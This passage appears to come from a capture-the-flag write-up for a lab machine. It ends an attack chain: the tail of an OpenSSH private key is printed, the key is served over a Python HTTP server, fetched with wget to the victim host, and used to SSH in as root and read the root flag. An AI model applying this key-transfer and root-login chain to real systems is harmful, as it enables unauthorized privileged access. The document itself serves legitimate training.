wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado
arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI
j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn
b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg
Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR
Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg
3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2
m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/
a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN
peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u
TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG
TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D
Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA
wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo
0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO
1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP
WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo
0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr
DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1
Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl
/RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh
oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq
2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf
6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END OPENSSH PRIVATE KEY-----
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>

`wget http://192.168.56.118/id_rsa -P /tmp`:
```
--2024-09-25 14:06:16--  http://192.168.56.118/id_rsa
Conectando con 192.168.56.118:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2588 (2,5K) [application/octet-stream]
Grabando a: «/tmp/id_rsa»

id_rsa              100%[===================>]   2,53K  --.-KB/s    en 0s      

2024-09-25 14:06:16 (168 MB/s) - «/tmp/id_rsa» guardado [2588/2588] ←
```
`chmod 600 /tmp/id_rsa`
`ls -alps ./`:
```
total 996
  4 drwxrwxrwt  9 root root   4096 sep 25 14:06 ./
  4 drwxr-xr-x 18 root root   4096 jun  7  2023 ../
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .font-unix/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .ICE-unix/
  4 -rw-------  1 cris cris   2588 sep 25 14:01 id_rsa ←
112 -rw-r--r--  1 cris cris 113257 sep 25 12:00 linpeas_output.txt
844 -rwxr-xr-x  1 cris cris 860337 sep 25 11:55 linpeas.sh
  4 drwx------  3 root root   4096 sep 25 09:23 systemd-private-e755993c842f40b9b34504365c0f69d2-systemd-logind.service-L0hjij/
  4 drwx------  3 root root   4096 sep 25 09:23 systemd-private-e755993c842f40b9b34504365c0f69d2-systemd-timesyncd.service-wNlwWe/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .Test-unix/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .X11-unix/
  4 drwxrwxrwt  2 root root   4096 sep 25 09:23 .XIM-unix/
```

`ssh -i ./id_rsa root@localhost`:
```
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 25 14:16:44 2024 from 127.0.0.1
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`
`ls -alps`:
```
total 32
4 drwx------  5 root root 4096 sep 25 13:39 ./
4 drwxr-xr-x 18 root root 4096 jun  7  2023 ../
0 lrwxrwxrwx  1 root root    9 jun  7  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 sep 25 13:39 .cache/
4 drwxr-xr-x  3 root root 4096 jun  7  2023 .local/
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   19 jun  7  2023 root_fl4g.txt
4 drwx------  2 root root 4096 jun  7  2023 .ssh/
```

`cat ./root_fl4g.txt`:
```
wRt2xlFjcYqXXo4HMV ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
